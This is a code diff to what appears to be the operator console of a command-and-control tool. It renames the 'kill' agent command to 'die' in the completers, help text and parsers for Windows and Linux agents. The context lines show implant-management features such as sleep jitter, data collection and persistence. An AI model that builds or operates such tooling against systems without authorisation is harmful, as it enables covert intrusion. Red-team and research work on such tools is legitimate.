@@ -115,7 +115,7 @@ agent_completer_windows = NestedCompleter.from_nested_dict({
     'speak': None,
     'sleep': None,
     'collect': None,
-    'kill': None,
+    'die': None,
     'show': None,
     'back': None,
     'cls': None,
@@ -132,7 +132,7 @@ agent_completer_linux = NestedCompleter.from_nested_dict({
     },
     'sleep': None,
     'collect': None,
-    'kill': None,
+    'die': None,
     'show': None,
     'back': None,
     'cls': None,
@@ -241,7 +241,7 @@ def print_agent_help(os):
     sleep <sleep-time> <jitter-%>          ->  Change sleep time interval and jitter
     clear                                  ->  Clear pending commands
     collect                                ->  Recollect agent data
-    kill                                   ->  Kill the agent (persistence will still take place)
+    die                                   ->  Kill the agent
     
     --== General ==--
     show                                   ->  Show agent details
@@ -269,7 +269,7 @@ def print_agent_help(os):
     sleep <sleep-time> <jitter-%>          ->  Change sleep time interval and jitter
     clear                                  ->  Clear pending commands
     collect                                ->  Recollect agent data
-    kill                                   ->  Kill the agent
+    die                                   ->  Kill the agent
     
     --== General ==--
     show                                   ->  Show agent details
@@ -510,9 +510,9 @@ def agent_screen_windows(agent_id):
                 listener.agents[agent_id]["pending_commands"] = []
                 continue
 
-            elif re.fullmatch(r"\s*kill\s*", command):
+            elif re.fullmatch(r"\s*die\s*", command):
                 command_dict = {
-                    "command_type": "kill"
+                    "command_type": "die"
                 }
 
             elif re.fullmatch(r"\s*collect\s*", command):
@@ -627,9 +627,9 @@ def agent_screen_linux(agent_id):
                 listener.agents[agent_id]["pending_commands"] = []
                 continue
 
-            elif re.fullmatch(r"\s*kill\s*", command):
+            elif re.fullmatch(r"\s*die\s*", command):
                 command_dict = {
-                    "command_type": "kill"
+                    "command_type": "die"
                 }
 
             elif re.fullmatch(r"\s*collect\s*", command):
